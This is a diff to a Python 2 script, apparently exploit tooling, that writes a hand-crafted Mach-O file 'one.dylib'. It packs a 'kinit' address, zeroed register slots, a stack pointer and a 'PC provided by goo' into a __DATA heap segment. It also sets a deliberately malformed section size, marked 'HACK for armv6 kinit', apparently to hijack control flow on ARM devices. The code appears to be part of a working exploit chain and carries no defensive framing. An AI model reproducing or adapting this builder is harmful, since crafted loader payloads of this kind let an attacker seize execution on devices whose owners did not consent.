@@ -18,11 +18,12 @@ if len(sys.argv) <= 1:
     print 'Usage: one.py <heapfile>'
     sys.exit(1)
 
-# heap: [init function that is actually kinit] [SP] [PC provided by goo] [the rest...]
-heap = struct.pack('II', cfg['#cache']['kinit'], heapaddr + 12)
+# heap: [init function that is actually kinit] R6 R9 R12 SP [PC provided by goo] [the rest...]
+heap = struct.pack('IIIII', cfg['#cache']['kinit'], 0, 0, 0, heapaddr + 20 + 4)
 heap += open(sys.argv[1], 'rb').read()
 
 heapsize = len(heap)
+heapoff = 0x1000
 
 fp = open('one.dylib', 'wb')
 OFF = 0
@@ -85,10 +86,9 @@ f(1)
 f(56 + 1*68)
 f('__DATA' + '\0'*10)
 f(heapaddr) # vmaddr
-linky = OFF
-f(0xbeef) # vmsize
-f(0xbeef) # fileoff
-f(0xbeef) # filesize
+f(heapsize) # vmsize
+f(heapoff) # fileoff
+f(heapsize) # filesize
 f(3) # maxprot = VM_PROT_READ | VM_PROT_WRITE
 f(3) # initprot = VM_PROT_READ | VM_PROT_WRITE
 f(1) # 1 section
@@ -98,9 +98,9 @@ f(0) # flags=0
 f('__heap' + '\0'*10)
 f('__DATA' + '\0'*10)
 f(heapaddr) # address
-split1 = OFF
-f(0xbeef) # size
-f(0xbeef) # off
+# HACK for armv6 kinit
+f(heapaddr << 2) # size
+f(heapoff) # off
 f(0) # align
 f(0) # reloff
 f(0) # nreloc
@@ -138,14 +138,3 @@ fp.seek(OFF)
 fp.seek(0x1000)
 heapoff = fp.tell()
 fp.write(heap)
-
-print hex(fp.tell())
-#assert fp.tell() < 0x4000
-OFF = fp.tell()
-
-fp.seek(split1)
-fp.write(struct.pack('II', heapsize, heapoff))
-fp.seek(linky)
-fp.write(struct.pack('III', heapsize, heapoff, heapsize))
-
-
